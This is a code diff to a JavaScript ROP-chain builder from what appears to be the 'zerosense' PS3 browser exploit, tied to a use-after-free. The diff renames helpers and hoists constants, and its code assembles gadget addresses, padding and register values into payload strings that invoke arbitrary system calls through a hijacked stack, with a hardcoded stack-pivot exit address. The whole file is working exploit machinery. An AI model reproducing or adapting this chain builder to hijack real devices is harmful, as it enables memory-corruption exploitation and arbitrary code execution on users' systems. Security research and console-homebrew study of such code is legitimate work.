@@ -1,5 +1,13 @@
 var Util = require('zerosense/Util');
 
+/**
+ * SP_EXIT is the address of 0x39C1868 in 0x8fd8xxxx, which is the callstack of the uaf minus 2
+ * Address to the double, offset by -0x10
+ */
+var SP_EXIT = 0x8FD8DCD0 - 0x10;
+
+var ADDR_GTEMP = 0x8D000000;
+
 class ChainBuilder {
 	
 	constructor() {
@@ -7,76 +15,67 @@ class ChainBuilder {
 	}
 	
 	static setup2(addr) {
-		var charCommas = unescape("\u8282");
+		var commas = unescape("\u8282");
 		
 		return unescape("\u0102\u7efb")
-			+ Util.padding(0x30, charCommas)
-			+ Util.int2bin(addr)
+			+ Util.pad(0x30, commas)
+			+ Util.int32(addr)
 			+ unescape("\ufb7e");
 	}
 	
 	static setup1(addr) {		
 		return unescape("\u4141\u7efa")
-			+ Util.int2bin(addr)
+			+ Util.int32(addr)
 			+ unescape("\ufa7e");
 	}
 	
 	create() {
-		var charAA = unescape("\u4141");
+		var AA = unescape("\u4141");
 		
 		var start = unescape("\u4141\u2a2f")
-			+ Util.int2bin(Offsets.addrGadget1)
-			+ Util.int2bin(Offsets.addrToc)
-			+ Util.padding(0x20, charAA)
-			+ Util.int2bin64(0x0, Offsets.addrToc)
-			+ Util.padding(0x70, charAA);
+			+ Util.int32(Offsets.addrGadget1)
+			+ Util.int32(Offsets.addrToc)
+			+ Util.pad(0x20, AA)
+			+ Util.int64(0x0, Offsets.addrToc)
+			+ Util.pad(0x70, AA);
 			
-		var end = Util.int2bin64(0x0, Offsets.addrGadgetMod8)
+		var end = Util.int64(0x0, Offsets.addrGadgetMod8)
 			+ unescape("\u2f2a");
 			
 		return start + this.data + end;
 	}
 	
-	syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, _r31out) {
-		var charAA = unescape("\u4141");
-		var addrGtemp = 0x8D000500;
-		var spExit = 0x8FD8DCC0;
-		/**
-		 * spExit is the address of 0x39C1868 in 0x8fd8 -ish, which is the callstack of the uaf minus 2
-		 * This isn't the same as ps3xploit = 0x8FD8DCC0 (since we use more memory?)
-		 * 0x8f390000 + 0x9fd200 - 0x10   (remember this is a ptr to a double!)
-		 */
+	syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out = ADDR_GTEMP) {
+		var AA = unescape("\u4141");
 		
-		var r31out = typeof _r31out !== 'undefined' ?  _r31out : addrGtemp;
-		
-		this.data += Util.int2bin64(0x0, Offsets.addrGadgetMod2)
-			+ Util.padding(0x60, charAA)
-			+ Util.int2bin64(0x0, addrGtemp)
-			+ Util.padding(0x10, charAA)
-			+ Util.int2bin64(0x0, Offsets.addrGadgetMod1)
-			+ Util.padding(0x50, charAA)
-			+ Util.padding(0xC, charAA)
-			+ Util.int2bin(sc)
-			+ Util.int2bin(r10)
-			+ Util.int2bin(r8)
-			+ Util.int2bin(r7)
-			+ Util.int2bin(r6)
-			+ Util.int2bin(r5)
-			+ Util.int2bin(r4)
-			+ Util.padding(0x4, charAA)
-			+ Util.int2bin(r9)
-			+ Util.padding(0x20, charAA)
-			+ Util.int2bin64(0x0, r3)
-			+ Util.padding(0x10, charAA)
-			+ Util.int2bin64(0x0, Offsets.addrGadgetMod2)
-			+ Util.padding(0x60, charAA)
-			+ Util.int2bin64(0x0, addrGtemp)
-			+ Util.padding(0x10, charAA)
-			+ Util.int2bin64(0x0, Offsets.addrGadgetMod4a)
-			+ Util.padding(0x60, charAA)
-			+ Util.int2bin64(0x0, r31out)
-			+ Util.int2bin64(0x0, spExit)
-			+ Util.padding(0x8, charAA);
+		this.data += Util.int64(0x0, Offsets.addrGadgetMod2)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, ADDR_GTEMP)
+			+ Util.pad(0x10, AA)
+			+ Util.int64(0x0, Offsets.addrGadgetMod1)
+			+ Util.pad(0x50, AA)
+			+ Util.pad(0xC, AA)
+			+ Util.int32(sc)
+			+ Util.int32(r10)
+			+ Util.int32(r8)
+			+ Util.int32(r7)
+			+ Util.int32(r6)
+			+ Util.int32(r5)
+			+ Util.int32(r4)
+			+ Util.pad(0x4, AA)
+			+ Util.int32(r9)
+			+ Util.pad(0x20, AA)
+			+ Util.int64(0x0, r3)
+			+ Util.pad(0x10, AA)
+			+ Util.int64(0x0, Offsets.addrGadgetMod2)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, ADDR_GTEMP)
+			+ Util.pad(0x10, AA)
+			+ Util.int64(0x0, Offsets.addrGadgetMod4a)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, r31out)
+			+ Util.int64(0x0, SP_EXIT)
+			+ Util.pad(0x8, AA);
 			
 		return this;
 	}
